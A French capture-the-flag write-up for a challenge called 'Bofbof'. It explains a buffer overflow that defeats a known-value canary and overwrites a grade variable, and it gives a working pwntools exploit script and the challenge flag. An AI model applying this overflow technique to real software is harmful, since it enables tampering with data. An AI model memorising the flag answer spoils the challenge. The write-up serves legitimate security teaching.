# Bofbof

## Difficulté : moyen

### Description :

Nous avons réussi à obtenir un accès au serveur des notes de MDI104 ! Mais il semble que les notes soient légèrement truquées...
Je suis sur que vous trouverez le moyen de valider.

### Analyse

Nous avons ici affaire à une faille classique: le Buffer Overflow. L'utilisateur peut entrer une chaîne de caractères aussi longue qu'il le souhaite dans code, ce qui aura pour effet d'écraser les variables suivantes.

Ici, une "protection" a été mise en place. Une variable est située entre la note et le code pour vérifier que celle-ci n'a pas été écrasée. Cependant, sa valeur est connue, et il suffit de l'écraser en lui donnant la même valeur.

Ainsi, il nous faut remplir le code, écrire les octets 0xdeadbeef, en prenant garde au little endian, qui met à la fin les octets de poids faible (0xdeadbeef => \xef\xbe\xad\xde) puis écrire notre valeur, c'est-à-dire 20.

### Exploitation

On peut utiliser la librairie pwntools de python pour mener à bien l'exploitation:

```python
from pwn import *

sh = process('./bofbof')
sh.recvline()

protector = p32(0xdeadbeef)
padding = protector * 7

value = p32(20)
sh.sendline(padding + value)
print(sh.recvline())
sh.interactive()
```

### Solution

CTF101{720be840c09652ef7121bef03c2bfebe}